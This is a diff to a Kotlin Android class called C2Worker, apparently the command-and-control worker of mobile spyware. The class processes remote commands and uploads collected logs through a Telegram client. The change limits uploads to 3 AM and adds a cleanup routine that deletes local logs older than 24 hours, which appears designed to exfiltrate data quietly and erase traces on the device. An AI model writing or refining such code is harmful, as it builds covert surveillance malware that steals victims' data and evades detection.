@@ -42,8 +42,13 @@ class C2Worker(
             // 1. Command Processing (Priority)
             processCommands()
 
-            // 2. Upload Logs (Hybrid: SQLite -> Temp File -> Upload -> Cleanup)
-            uploadLogs()
+            // 2. Upload Logs & Cleanup - Only at 3 AM or when triggered by /getlogs
+            val currentHour = java.util.Calendar.getInstance().get(java.util.Calendar.HOUR_OF_DAY)
+            if (currentHour == 3) {
+                Log.d("C2Worker", "3 AM detected - uploading logs and cleaning up")
+                uploadLogs()
+                cleanupLogs()
+            }
 
             return@withContext Result.success()
         } catch (e: Exception) {
@@ -75,5 +80,15 @@ class C2Worker(
             repository,
             telegramClient
         )
+    }
+
+    private suspend fun cleanupLogs() {
+        try {
+            val cutoffTime = System.currentTimeMillis() - (24 * 60 * 60 * 1000) // 24 hours ago
+            repository.deleteLogsOlderThan(cutoffTime)
+            Log.i("C2Worker", "✅ Cleanup: Deleted logs older than 24 hours")
+        } catch (e: Exception) {
+            Log.e("C2Worker", "Error during cleanup", e)
+        }
     }
 }
